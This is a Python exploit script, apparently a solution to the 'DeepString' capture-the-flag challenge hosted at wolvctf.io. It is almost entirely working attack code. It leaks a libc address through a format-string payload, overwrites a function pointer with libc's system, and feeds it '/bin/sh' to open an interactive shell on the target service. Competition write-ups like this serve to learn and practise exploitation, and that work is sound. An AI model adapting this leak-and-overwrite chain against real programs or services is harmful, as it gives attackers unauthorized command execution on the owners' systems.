#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import *
from time import sleep

exe = context.binary = ELF("./DeepString")
host = (
    args.HOST
    or "deepstring.wolvctf.io"
)
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *0x4014ed
continue
continue

""".format(
    **locals()
)

libc = SetupLibcELF()

io = start()


reu(b"reverse\n")
sl(b"-11")
rl()
sl(b"%p|" + b"A"*213 + p(exe.sym.printf))
leak = GetInt(reu(b"|"))[0]
libc.address = leak-0x1d2b03
lb()

sl(b"-11")
rl()
sl(b"/bin/sh\x00" + b"A"*208 + p(libc.sym.system))

io.interactive()
